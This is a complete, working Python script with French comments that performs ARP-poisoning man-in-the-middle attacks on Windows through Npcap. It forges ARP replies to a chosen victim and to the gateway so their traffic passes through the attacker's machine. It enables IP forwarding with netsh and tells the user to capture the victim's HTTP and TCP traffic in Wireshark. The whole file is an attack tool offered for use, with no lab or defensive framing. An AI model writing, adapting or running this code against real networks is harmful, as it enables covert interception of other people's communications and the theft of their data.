#!/usr/bin/env python3
"""
ARP MITM Poisoner — Windows native (Npcap + WinAPI, 0 lib externe)

Pré-requis:
  1. Installe Npcap: https://npcap.com/#download  (option "WinPcap API compat" cochée)
  2. Lance en Administrateur: python arp_mitm_windows.py

Usage:
  python arp_mitm_windows.py --list                 # liste les interfaces
  python arp_mitm_windows.py -t 192.168.1.42 -g 192.168.1.1
  python arp_mitm_windows.py -t 192.168.1.42 -g 192.168.1.1 -i 1

Après lancement, pour voir le trafic HTTP:
  Installe Wireshark (wireshark.org) → filtre: http && ip.src == 192.168.1.42
"""

import ctypes, ctypes.wintypes, struct, socket, sys, time, os, argparse, signal, threading

# ─── WinAPI: iphlpapi.dll ────────────────────────────────────────────────────
iphlp = ctypes.WinDLL("iphlpapi.dll")
ws2   = ctypes.WinDLL("ws2_32.dll")

def ip_to_dword(ip: str) -> int:
    """192.168.1.1 → little-endian DWORD pour WinAPI."""
    return struct.unpack("<I", socket.inet_aton(ip))[0]

def resolve_mac_sendarp(target_ip: str, src_ip: str = "0.0.0.0") -> bytes | None:
    """
    Utilise SendARP() de iphlpapi — fonction Windows native qui envoie un
    vrai ARP request et retourne la MAC. Aucune lib externe.
    """
    dst  = ip_to_dword(target_ip)
    src  = ip_to_dword(src_ip)
    mac  = (ctypes.c_ubyte * 6)()
    size = ctypes.c_ulong(6)
    ret  = iphlp.SendARP(dst, src, ctypes.byref(mac), ctypes.byref(size))
    if ret == 0:
        return bytes(mac)
    return None

def get_adapters_info() -> list[dict]:
    """
    GetAdaptersInfo() → liste des interfaces avec IP + MAC.
    Retourne: [{"index": int, "name": str, "ip": str, "mac": bytes, "gw": str}]
    """
    # IP_ADAPTER_INFO struct (taille fixe)
    MAX_ADAPTER_NAME = 260
    MAX_ADAPTER_DESC = 132
    MAX_ADAPTER_ADDRESS = 8

    class IP_ADDR_STRING(ctypes.Structure):
        pass

    IP_ADDR_STRING._fields_ = [
        ("Next",       ctypes.POINTER(IP_ADDR_STRING)),
        ("IpAddress",  ctypes.c_char * 16),
        ("IpMask",     ctypes.c_char * 16),
        ("Context",    ctypes.c_ulong),
    ]

    class IP_ADAPTER_INFO(ctypes.Structure):
        pass

    IP_ADAPTER_INFO._fields_ = [
        ("Next",            ctypes.POINTER(IP_ADAPTER_INFO)),
        ("ComboIndex",      ctypes.c_ulong),
        ("AdapterName",     ctypes.c_char * MAX_ADAPTER_NAME),
        ("Description",     ctypes.c_char * MAX_ADAPTER_DESC),
        ("AddressLength",   ctypes.c_uint),
        ("Address",         ctypes.c_ubyte * MAX_ADAPTER_ADDRESS),
        ("Index",           ctypes.c_ulong),
        ("Type",            ctypes.c_uint),
        ("DhcpEnabled",     ctypes.c_uint),
        ("CurrentIpAddress",ctypes.POINTER(IP_ADDR_STRING)),
        ("IpAddressList",   IP_ADDR_STRING),
        ("GatewayList",     IP_ADDR_STRING),
        ("DhcpServer",      IP_ADDR_STRING),
        ("HaveWins",        ctypes.c_bool),
        ("PrimaryWinsServer", IP_ADDR_STRING),
        ("SecondaryWinsServer", IP_ADDR_STRING),
        ("LeaseObtained",   ctypes.c_ulong),
        ("LeaseExpires",    ctypes.c_ulong),
    ]

    buf_size = ctypes.c_ulong(0)
    iphlp.GetAdaptersInfo(None, ctypes.byref(buf_size))
    buf = ctypes.create_string_buffer(buf_size.value)
    ret = iphlp.GetAdaptersInfo(buf, ctypes.byref(buf_size))
    if ret != 0:
        return []

    results = []
    adapter = ctypes.cast(buf, ctypes.POINTER(IP_ADAPTER_INFO)).contents
    while True:
        mac = bytes(adapter.Address[:adapter.AddressLength])
        ip  = adapter.IpAddressList.IpAddress.decode()
        gw  = adapter.GatewayList.IpAddress.decode()
        desc= adapter.Description.decode(errors="ignore")
        idx = adapter.Index
        if ip and ip != "0.0.0.0":
            results.append({"index": idx, "name": desc, "ip": ip, "mac": mac, "gw": gw})
        if not adapter.Next:
            break
        adapter = adapter.Next.contents

    return results

# ─── Npcap: wpcap.dll ────────────────────────────────────────────────────────
NPCAP_PATHS = [
    r"C:\Windows\System32\Npcap\wpcap.dll",
    r"C:\Windows\SysWOW64\Npcap\wpcap.dll",
    "wpcap.dll",
]

def load_npcap():
    for path in NPCAP_PATHS:
        try:
            return ctypes.CDLL(path)
        except OSError:
            pass
    return None

def npcap_open(wpcap, iface_name: str, snaplen=65535, promisc=1, timeout=1000):
    """pcap_open_live → pcap_t*"""
    errbuf = ctypes.create_string_buffer(256)
    wpcap.pcap_open_live.restype = ctypes.c_void_p
    handle = wpcap.pcap_open_live(
        iface_name.encode(),
        snaplen, promisc, timeout,
        errbuf
    )
    return handle

def npcap_send(wpcap, handle, packet: bytes) -> bool:
    """pcap_sendpacket(handle, buf, len) → 0 si ok."""
    buf = ctypes.create_string_buffer(packet)
    ret = wpcap.pcap_sendpacket(handle, buf, len(packet))
    return ret == 0

def find_npcap_device(wpcap, adapter_ip: str) -> str | None:
    """
    Trouve le nom pcap de l'interface qui correspond à l'IP donnée.
    pcap_findalldevs_ex → liste des devices Npcap (noms style \Device\NPF_{GUID}).
    """
    class pcap_addr(ctypes.Structure):
        pass

    class pcap_if(ctypes.Structure):
        pass

    pcap_addr._fields_ = [
        ("next",     ctypes.POINTER(pcap_addr)),
        ("addr",     ctypes.c_void_p),
        ("netmask",  ctypes.c_void_p),
        ("broadaddr",ctypes.c_void_p),
        ("dstaddr",  ctypes.c_void_p),
    ]

    pcap_if._fields_ = [
        ("next",        ctypes.POINTER(pcap_if)),
        ("name",        ctypes.c_char_p),
        ("description", ctypes.c_char_p),
        ("addresses",   ctypes.POINTER(pcap_addr)),
        ("flags",       ctypes.c_uint),
    ]

    alldevs = ctypes.POINTER(pcap_if)()
    errbuf  = ctypes.create_string_buffer(256)
    wpcap.pcap_findalldevs.restype = ctypes.c_int
    wpcap.pcap_findalldevs(ctypes.byref(alldevs), errbuf)

    dev = alldevs
    devices = []
    while dev:
        name = dev.contents.name.decode() if dev.contents.name else ""
        desc = dev.contents.description.decode() if dev.contents.description else ""
        devices.append((name, desc))
        dev = dev.contents.next

    wpcap.pcap_freealldevs(alldevs)

    # essaie de matcher par description (contient souvent l'IP ou un GUID)
    # fallback: retourne le premier device non-loopback
    for name, desc in devices:
        if "loopback" not in desc.lower() and "npcap" not in desc.lower():
            return name
    return devices[0][0] if devices else None

# ─── ARP packet craft ─────────────────────────────────────────────────────────
def mac_str(mac: bytes) -> str:
    return ':'.join(f'{b:02x}' for b in mac)

def build_arp_reply(src_mac: bytes, dst_mac: bytes,
                    spa: str, tpa: str, tha: bytes) -> bytes:
    """ARP Reply: "spa est à src_mac" — envoyé à dst_mac."""
    eth = struct.pack("!6s6sH", dst_mac, src_mac, 0x0806)
    arp = struct.pack("!HHBBH6s4s6s4s",
        0x0001, 0x0800, 6, 4, 0x0002,
        src_mac,
        socket.inet_aton(spa),
        tha,
        socket.inet_aton(tpa)
    )
    return eth + arp

def build_arp_restore(real_mac: bytes, dst_mac: bytes,
                      spa: str, tpa: str, tha: bytes) -> bytes:
    """ARP Reply avec la vraie MAC pour restaurer les tables."""
    return build_arp_reply(real_mac, dst_mac, spa, tpa, tha)

# ─── MAIN ─────────────────────────────────────────────────────────────────────
RUNNING = True

def main():
    global RUNNING

    p = argparse.ArgumentParser(description="ARP MITM — Windows (Npcap)")
    p.add_argument("--list", action="store_true", help="Liste les interfaces")
    p.add_argument("-t", "--target",  help="IP victime (ton tel)")
    p.add_argument("-g", "--gateway", help="IP routeur")
    p.add_argument("-i", "--iface-index", type=int, default=0,
                   help="Index interface (voir --list)")
    p.add_argument("--interval", type=float, default=1.5)
    args = p.parse_args()

    # ── charge Npcap ──────────────────────────────────────────────────────────
    wpcap = load_npcap()
    if not wpcap:
        print("[✗] Npcap introuvable!")
        print("    Installe-le: https://npcap.com/#download")
        print("    Coche 'Install Npcap in WinPcap API-compatible Mode' ✓")
        sys.exit(1)

    # ── liste interfaces ──────────────────────────────────────────────────────
    adapters = get_adapters_info()
    if not adapters:
        print("[✗] Aucune interface trouvée")
        sys.exit(1)

    if args.list or not args.target:
        print("\n  Interfaces disponibles:\n")
        for i, a in enumerate(adapters):
            print(f"  [{i}] {a['name'][:50]}")
            print(f"       IP: {a['ip']}  |  MAC: {mac_str(a['mac'])}  |  GW: {a['gw']}")
        print()
        if not args.target:
            print("Usage: python arp_mitm_windows.py -t <ip_tel> -g <ip_routeur> [-i <index>]")
            sys.exit(0)
        return

    if not args.gateway:
        # auto-detect gateway depuis l'interface
        gw = adapters[args.iface_index].get("gw", "")
        if not gw or gw == "0.0.0.0":
            print("[!] Gateway introuvable — spécifie avec -g")
            sys.exit(1)
        args.gateway = gw
        print(f"[*] Gateway auto-détecté: {args.gateway}")

    adapter  = adapters[args.iface_index]
    our_ip   = adapter["ip"]
    our_mac  = adapter["mac"]

    print(f"""
╔══════════════════════════════════════════════════════╗
║           ARP MITM POISONER — Windows                ║
╠══════════════════════════════════════════════════════╣
║  Interface : {adapter['name'][:40]:<40}║
║  Notre IP  : {our_ip:<40}║
║  Notre MAC : {mac_str(our_mac):<40}║
║  Victime   : {args.target:<40}║
║  Gateway   : {args.gateway:<40}║
╚══════════════════════════════════════════════════════╝
""")

    # ── résolution MACs ────────────────────────────────────────────────────────
    print(f"[*] Résolution MAC de la victime {args.target}...")
    victim_mac = resolve_mac_sendarp(args.target, our_ip)
    if not victim_mac:
        print(f"[✗] Impossible de résoudre {args.target}")
        print("    → Tel éteint, mauvaise IP, ou pas sur le même réseau")
        sys.exit(1)
    print(f"[✓] Victime  : {args.target} → {mac_str(victim_mac)}")

    print(f"[*] Résolution MAC du gateway {args.gateway}...")
    gw_mac = resolve_mac_sendarp(args.gateway, our_ip)
    if not gw_mac:
        print(f"[✗] Impossible de résoudre {args.gateway}")
        sys.exit(1)
    print(f"[✓] Gateway  : {args.gateway} → {mac_str(gw_mac)}")

    # ── ouvre Npcap ───────────────────────────────────────────────────────────
    pcap_dev = find_npcap_device(wpcap, our_ip)
    if not pcap_dev:
        print("[✗] Aucun device Npcap trouvé")
        sys.exit(1)

    handle = npcap_open(wpcap, pcap_dev)
    if not handle:
        print(f"[✗] pcap_open_live échoué sur {pcap_dev}")
        sys.exit(1)

    # ── active IP forwarding Windows ───────────────────────────────────────────
    os.system("netsh int ipv4 set global forwarding=enabled >nul 2>&1")
    print("[✓] IP forwarding activé")

    # ── paquets ARP poison ────────────────────────────────────────────────────
    # → victime: "le routeur c'est moi (our_mac)"
    pkt_to_victim = build_arp_reply(our_mac, victim_mac, args.gateway, args.target, victim_mac)
    # → routeur: "la victime c'est moi (our_mac)"
    pkt_to_gw     = build_arp_reply(our_mac, gw_mac, args.target, args.gateway, gw_mac)

    print(f"""
[✓] MITM actif — trafic {args.target} ↔ {args.gateway} passe par toi

  Pour voir le trafic:
    Wireshark → sélectionne ton interface WiFi
    Filtre:  http && ip.src == {args.target}
    Filtre:  tcp  && ip.src == {args.target}

  CTRL+C pour stopper + restaurer les tables ARP
""")

    def on_sigint(sig, frame):
        global RUNNING
        RUNNING = False
    signal.signal(signal.SIGINT, on_sigint)

    cnt = 0
    while RUNNING:
        npcap_send(wpcap, handle, pkt_to_victim)
        npcap_send(wpcap, handle, pkt_to_gw)
        cnt += 1
        print(f"\r  [💉] Paquets ARP: {cnt*2}  (CTRL+C pour stop)", end="", flush=True)
        time.sleep(args.interval)

    # ── restore ────────────────────────────────────────────────────────────────
    print("\n[*] Restauration tables ARP...")
    for _ in range(5):
        r1 = build_arp_restore(gw_mac, victim_mac, args.gateway, args.target, victim_mac)
        r2 = build_arp_restore(victim_mac, gw_mac, args.target, args.gateway, gw_mac)
        npcap_send(wpcap, handle, r1)
        npcap_send(wpcap, handle, r2)
        time.sleep(0.3)

    os.system("netsh int ipv4 set global forwarding=disabled >nul 2>&1")
    print("[✓] Done. Tables ARP restaurées.")

if __name__ == "__main__":
    if sys.platform != "win32":
        print("[!] Ce script est pour Windows. Sur Linux utilise arp_mitm.py")
        sys.exit(1)
    main()
